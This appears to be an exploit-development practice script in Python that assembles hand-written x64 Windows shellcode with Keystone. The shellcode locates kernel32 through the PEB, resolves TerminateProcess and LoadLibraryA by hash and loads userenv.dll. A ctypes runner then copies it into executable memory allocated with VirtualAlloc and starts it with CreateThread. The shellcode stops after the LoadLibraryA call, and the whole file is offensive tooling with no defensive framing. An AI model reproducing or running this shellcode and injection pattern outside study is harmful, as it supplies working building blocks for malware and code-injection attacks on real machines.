import ctypes, struct
import binascii
import os
import subprocess
from keystone import *

def main():
    SHELLCODE = (
        " start: "
        "   int3;"                          # Breakpoint for Windbg.    
        "   mov rbp, rsp;"
        "   add rsp, 0xfffffffffffff4f0;"   # Avoid Null Bytes

        " find_kernel32:"
        "   xor rcx, rcx;"                  # Zero RCX contents
        "   mov rax, gs:[rcx + 0x60];"      # 0x060 ProcessEnvironmentBlock to RAX.
        "   mov rax, [rax + 0x18];"         # 0x18  ProcessEnvironmentBlock.Ldr Offset
        "   mov rsi, [rax + 0x20];"         # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
        "   lodsq;"                         # RAX = ntdll.dll
        "   xchg rax, rsi;"                 # Exchange RAX,RSI
        "   lodsq;"                         # RAX = kernel32.dll
        "   mov rbx, [rax + 0x20];"         # RBX = kernel32.dll base addr

        " find_function_shorten:"           #
        "   jmp find_function_shorten_bnc;" # Short jump

        " find_function_ret:"               #
        "   pop rsi;"                       # POP the return address from the stack     
        "   mov [rbp+0x08], rsi;"           # Save find_function address for later usage
        "   jmp resolve_symbols_kernel32;"  #

        " find_function_shorten_bnc:"       #   
        "   call find_function_ret;"        # Relative CALL with negative offset

        " find_function:"                   #         
        "   pushfq;"                        # Save all registers
                                            # Base address of kernel32 is in rbx from 
                                            # Previous step (find_kernel32)
        "   mov eax, [rbx+0x3c];"           # Offset to PE Signature
        "   mov edi, [rbx+rax+0x88];"       # Export Table Directory RVA
        "   add rdi, rbx;"                  # Export Table Directory VMA
        "   mov ecx, [rdi+0x18];"           # NumberOfNames
        "   mov eax, [rdi+0x20];"           # AddressOfNames RVA
        "   add rax, rbx;"                  # AddressOfNames VMA
        "   mov [rbp-8], rax;"              # Save AddressOfNames VMA for later       

        " find_function_loop:"              #
        "   jecxz find_function_finished;"  # Jump to the end if rcx is 0
        "   dec rcx;"                       # Decrement our names counter
        "   mov rax, [rbp-8];"              # Restore AddressOfNames VMA
        "   xor rsi, rsi;"                  # Clear any leftovers
        "   mov esi, [rax+rcx*4];"          # Get the RVA of the symbol name
        "   add rsi, rbx;"                  # Set RSI to the VMA of the current symbol name

        " compute_hash:"                    #
        "   xor rax, rax;"                  # NULL rax
        "   cdq;"                           # NULL rdx
        "   cld;"                           # Clear direction

        " compute_hash_again:"              #
        "   lodsb;"                         # Load the next byte from esi into al
        "   test al, al;"                   # Check for NULL terminator
        "   jz compute_hash_finished;"      # If the ZF is set, we've hit the NULL term
        "   ror edx, 0x0d;"                 # Rotate rdx 13 bits to the right
        "   add rdx, rax;"                  # Add the new byte to the accumulator
        "   jmp compute_hash_again;"        # Next iteration

        " compute_hash_finished:"           #

        " find_function_compare:"           #  
        "   cmp   edx, [rsp+0x10];"         # Compare the computed hash with the requested hash    
        "   jnz   find_function_loop;"      # If it doesn't match go back to find_function_loop
 
        "   mov   edx, [rdi+0x24];"         # AddressOfNameOrdinals RVA
        "   add   rdx, rbx;"                # AddressOfNameOrdinals VMA
        "   mov   cx,  [rdx+2*rcx];"        # Extrapolate the function's ordinal
        "   mov   edx, [rdi+0x1c];"         # AddressOfFunctions RVA
        "   add   rdx, rbx;"                # AddressOfFunctions VMA
        "   mov   eax, [rdx+4*rcx];"        # Get the function RVA
        "   add   rax, rbx;"                # Get the function VMA
        "   mov   [rsp+0x1c], rax;"         # Overwrite stack version of rax from pushad

        " find_function_finished:"          #    
        "   popfq;"                         # Restore registers
        "   ret;"                           #

        " resolve_symbols_kernel32:"        #   
        "   push  0x78b5b983;"              # TerminateProcess hash
        "   call [rbp+0x08];"               # Call find_function
        "   mov   [rbp+0x10], rax;"         # Save TerminateProcess address for later usage
        "   push  0xec0e4e8e;"              # LoadLibraryA hash
        "   call [rbp+0x08];"               # Call find_function
        "   mov   [rbp+0x14], rax;"         # Save LoadLibraryA address for later usage                  

        " load_userenv.dll:"                #
        "   int3;"                          # Breakpoint for Windbg.  
        "   xor   rax, rax;"                # NULL rax
        "   mov   rax, 0x6c6c6411;"         # Move the end of the string in AX
        "   shr   rax, 8;"                  # shright 8
        "   push  rax;"                     # Push rax on the stack with string NULL terminator
        "   push  0x2e766e65;"              # Push part of the string on the stack
        "   push  0x72657375;"              # Push another part of the string on the stack     
        "   push  rsp;"                     # Push ESP to have a pointer to the string
        "   call [rbp+0x14];"               # Call LoadLibraryA 





)
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: "  + output )
    print("Bytes: " + str(len(sh)))
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()